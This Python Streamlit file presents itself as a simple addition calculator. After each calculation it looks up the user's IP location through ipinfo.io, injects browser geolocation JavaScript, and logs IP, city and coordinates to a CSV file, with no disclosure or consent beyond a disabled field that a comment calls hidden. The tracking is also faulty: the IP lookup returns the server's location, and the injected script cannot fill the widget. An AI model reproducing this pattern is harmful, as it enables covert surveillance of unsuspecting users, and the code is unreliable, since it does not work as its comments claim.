# -*- coding: utf-8 -*-
"""
@author:G
"""
import streamlit as st
import requests
import pandas as pd
import os
from datetime import datetime

file_path = "user_data.csv"

# Function to get user IP location
def get_ip_location():
    try:
        response = requests.get("https://ipinfo.io/json")
        data = response.json()
        return data.get("city", "Unknown"), data.get("country", "Unknown"), data.get("ip", "Unknown")
    except:
        return "Unknown", "Unknown", "Unknown"

# Function to save data
def save_location_data(ip, city, country, lat, lon):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    new_entry = pd.DataFrame([[timestamp, ip, city, country, lat, lon]], 
                              columns=["Timestamp", "IP", "City", "Country", "Latitude", "Longitude"])

    if os.path.exists(file_path):
        new_entry.to_csv(file_path, mode='a', header=False, index=False)
    else:
        new_entry.to_csv(file_path, mode='w', index=False)

# JavaScript for browser-based geolocation
get_location_script = """
<script>
navigator.geolocation.getCurrentPosition(
    (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        document.getElementById("location").value = lat + "," + lon;
    }
);
</script>
"""

st.sidebar.title("My Streamlit App")
st.title("Simple Addition App")

X = st.number_input("Enter value for X:", value=0.0, step=1.0)
Y = st.number_input("Enter value for Y:", value=0.0, step=1.0)

if st.button("Calculate"):
    Z = X + Y
    st.success(f"Result: {Z}")

    city, country, ip = get_ip_location()
    
    # Hidden input field to store location from JavaScript
    location = st.text_input("Your location (lat, lon):", key="location", value="Waiting...", disabled=True)
    st.markdown(get_location_script, unsafe_allow_html=True)

    if location != "Waiting...":
        lat, lon = location.split(",")
        save_location_data(ip, city, country, lat, lon)  # Save accurate data



    
    